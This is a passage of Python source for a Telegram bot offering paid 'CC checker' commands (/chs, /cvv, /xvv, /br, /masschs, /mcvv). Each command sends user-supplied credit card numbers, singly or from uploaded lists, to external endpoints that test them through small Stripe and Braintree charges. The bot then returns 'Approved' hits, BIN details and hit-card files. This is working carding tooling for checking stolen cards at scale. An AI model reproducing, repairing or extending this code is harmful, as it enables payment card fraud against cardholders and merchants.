        'declined': [],
        'left': len(ccs),
        'stop': False,
        'last_hits': 0,
        'last_declined': 0,
        'last_left': len(ccs)
    }

    start_time = time.time()
    initial_message = await message.reply(
        f"**✿ Mass Auth Stripe ⛈️**\n"
        f"- - - - - - - - - - - - - - - - - - -\n"
        f"⸙ Total: {len(ccs)}\n"
        f"⸙ Day: {day}\n"
        f"⸙ Check by: @{username}\n"
        f"- - - - - - - - - - - - - - - - - - -\n",
    )

    await update_massau_buttons(user_id, initial_message)

    hits_file_path = f'hits_{username}_{day}.txt'
    declined_file_path = f'declined_{username}_{day}.txt'

    with open(hits_file_path, 'w', encoding='utf-8') as hits_file, open(declined_file_path, 'w', encoding='utf-8') as declined_file:
        for cc in ccs:
            if user_massau_data[user_id]['stop']:
                break
            api_url = f"https://auth-1-3llv.onrender.com/auth?cc={cc}"
            await process_cc(api_url, cc, hits_file, declined_file, user_id, initial_message)
            await asyncio.sleep(2)

    await update_massau_buttons(user_id, initial_message)

    elapsed_time = time.time() - start_time
    hits_count = len(user_massau_data[user_id]['hits'])
    declined_count = len(user_massau_data[user_id]['declined'])

    await message.reply(
        f"**✿ Mass Auth Stripe ⛈️**\n"
        f"Total: {len(ccs)}\n"
        f"Day: {day}\n"
        f"Check by: @{username}\n"
        f"Took: {elapsed_time:.2f} seconds\n"
        f"Hits: {hits_count}\n"
        f"Declined: {declined_count}"
    )

    if os.path.getsize(hits_file_path) > 0:
        await client.send_document(message.chat.id, hits_file_path, caption="Hits")
    if os.path.getsize(declined_file_path) > 0:
        await client.send_document(message.chat.id, declined_file_path, caption="Declined")

    os.remove(file_path)
    os.remove(hits_file_path)
    os.remove(declined_file_path)
    del user_massau_data[user_id]


#masschg



#@app.on_message(command_with_mention("masschg"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass CHG check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            api_url = f"http://172.31.12.79:5000/st5?lista={cc}"

            try:
                async with session.get(api_url) as response:
                    data = await response.json()
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    message_response = data.get("result", "Decline")

                    if "✅" in message_response:
                        hits += 1
                        card = data.get("cc", cc)
                        bank = data.get("bank", "Unknown")
                        country = data.get("country", "Unknown")
                        bin_info = data.get("bin_info", "Unknown")
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE $5 [ /masschg ]</b>\n"
                            f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n\n"
                            f"<b>Message ➜ {message_response}</b>\n"
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1

            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass CHG check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass CHG check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)


#masschs

@app.on_message(command_with_mention("masschs"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_ten(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass CHS check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            api_url = f"http://172.31.12.79:5000/st10?lista={cc}"

            try:
                async with session.get(api_url) as response:
                    data = await response.json()
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    message_response = data.get("result", "none")

                    if "✅" in message_response:
                        hits += 1
                        card = data.get("cc", cc)
                        bank = data.get("bank", "Unknown")
                        country = data.get("country", "Unknown")
                        bin_info = data.get("bin_info", "Unknown")
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE $10 [ /masschs ]</b>\n"
                            f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n\n"
                            f"<b>Message ➜ {message_response}</b>\n"
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1

            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass CHS check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass CHS check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)




    
    
#stripe 10$    

@app.on_message(command_with_mention("chs"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def check_stripe_ten(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_stripe_ten(client, message, user_info, *args, **kwargs))

async def process_stripe_ten(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/chs cc|month|year|cvv</code>\n\n<b>┬╗ Gateway:</b> Stripe $10 💰\n<b>┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    start_time = time.time()
    api_url = f"http://172.31.12.79:5000/st10?lista={cc}"
    
    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")

    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"

                card = data.get("cc", cc)
                bank = data.get("bank", "Unknown")
                country = data.get("country", "Unknown")
                bin_info = data.get("bin_info", "Unknown")
                message_response = data.get("result", "Decline")

                status = ""
                if "✅" in message_response:
                    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                elif "❌" in message_response:
                    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

                username = f"@{message.from_user.username} [{user_info.get('plan', 'Free')}]"
                reply_message = (
                    f"<b>STRIPE $10 [ /chs ]</b>\n"
                    f"{status}\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                    f"カ <b>Card:</b> <code>{card}</code>\n\n"
                    f"<b>Message ➜ {message_response}</b>\n"
                    f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                    f"<b>Bank:</b> ➜ {bank}\n"
                    f"<b>Country:</b> ➜ {country}\n"
                    f"<b>Bin Info:</b> ➜ {bin_info}\n\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                    f"<b>Req by ➜ {username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                await sticker_message.delete()

                await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit(f'⚠️ <b>An error occurred\n Please try again 😷</b>', parse_mode=enums.ParseMode.HTML)
            await sticker_message.delete()

# Stripe $5

#@app.on_message(command_with_mention("chg"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def check_stripe_five(client, message, user_info, *args, **kwargs):
    asyncio.create_task(process_stripe_five(client, message, user_info, *args, **kwargs))

async def process_stripe_five(client, message, user_info, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/chg cc|month|year|cvv</code>\n\n<b>┬╗ Gateway:</b> Stripe $5 🪽\n<b>┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    start_time = time.time()
    api_url = f"http://172.31.12.79:5000/st5?lista={cc}"
    
    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")

    processing_message = await message.reply('<b>🍳Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(api_url) as response:
                data = await response.json()
                
                elapsed_time = time.time() - start_time
                elapsed_seconds = f"{elapsed_time:.2f} seconds"

                card = data.get("cc", cc)
                bank = data.get("bank", "Unknown")
                country = data.get("country", "Unknown")
                bin_info = data.get("bin_info", "Unknown")
                message_response = data.get("result", "Decline")

                status = ""
                if "✅" in message_response:
                    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                elif "❌" in message_response:
                    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

                username = f"@{message.from_user.username} [{user_info.get('plan', 'Free')}]"
                reply_message = (
                    f"<b>STRIPE $5 [ /chg ]</b>\n"
                    f"{status}\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                    f"カ <b>Card:</b> <code>{card}</code>\n\n"
                    f"<b>Message ➜ {message_response}</b>\n"
                    f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                    f"<b>Bank:</b> ➜ {bank}\n"
                    f"<b>Country:</b> ➜ {country}\n"
                    f"<b>Bin Info:</b> ➜ {bin_info}\n\n"
                    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                    f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                    f"<b>Req by ➜ {username}</b>\n"
                    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                )
                await sticker_message.delete()

                await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
        except aiohttp.ClientError as e:
            await processing_message.edit(f'⚠️ <b>An error occurred\n Please try again 😷</b>', parse_mode=enums.ParseMode.HTML)
            await sticker_message.delete()
        
#stripe 0.1$    

@app.on_message(command_with_mention("cvv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/cvv cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe 1$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"https://gatev2.onrender.com/cvv?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE 1$ [ /cvv ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"<b>Message ➜ {api_response}</b>\n"  # Display the entire API response
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"  # Now correctly referencing the variable
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message
        
#mass cvv

@app.on_message(command_with_mention("mcvv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass CVV check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"https://xronak.whf.bz/r25.php?lista={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE 1$ [ /cvv ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass CVV check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass CVV check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)        
        
#stripe 25$    

@app.on_message(command_with_mention("xvv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/xvv cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe 25$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"https://xronak.whf.bz/r25.php?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE 25$ [ /xvv ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"<b>Message ➜ {api_response}</b>\n"  # Display the entire API response
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"  # Now correctly referencing the variable
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message        


#Braintree 1$    

@app.on_message(command_with_mention("br"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/br cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Braintree 1$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"http://xronak.site/c3.php?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
